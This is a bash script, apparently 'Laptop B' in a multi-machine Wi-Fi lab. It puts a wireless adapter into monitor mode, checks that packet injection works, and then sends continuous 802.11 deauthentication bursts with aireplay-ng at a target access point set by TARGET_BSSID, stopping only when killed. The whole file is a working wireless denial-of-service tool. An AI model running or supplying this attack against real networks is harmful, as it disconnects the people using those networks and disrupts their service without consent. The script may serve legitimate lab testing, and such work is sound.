#!/usr/bin/env bash
# laptop-b-attack.sh — Laptop B. Monitor mode + continuous deauth.
source "$(dirname "$0")/common.sh"
need_root
load_env
need_cmds airmon-ng aireplay-ng iw

MON_IF="${MON_IF:-wlan0}"
DEAUTH_BURST="${DEAUTH_BURST:-10}"
DEAUTH_SLEEP="${DEAUTH_SLEEP:-3}"

info "monitor mode on $MON_IF"
airmon-ng check kill >/dev/null 2>&1 || true
airmon-ng start "$MON_IF" >/dev/null 2>&1 || true
MON="${MON_IF}mon"
iw dev "$MON" info >/dev/null 2>&1 || MON="$MON_IF"
ok "monitor iface: $MON"

info "testing injection"
aireplay-ng --test "$MON" 2>&1 | grep -q "Injection is working" \
  || warn "injection test failed — deauth may not work; check adapter"

cleanup() {
  set +e
  warn "stopping deauth"
  pkill -f "aireplay-ng.*$MON" 2>/dev/null
  airmon-ng stop "$MON" >/dev/null 2>&1
  ok "clean"
}
trap cleanup EXIT INT TERM

info "deauth loop -> $TARGET_BSSID ($DEAUTH_BURST pkts / ${DEAUTH_SLEEP}s)"
while :; do
  aireplay-ng -0 "$DEAUTH_BURST" -a "$TARGET_BSSID" "$MON" >/dev/null 2>&1 || true
  sleep "$DEAUTH_SLEEP"
done
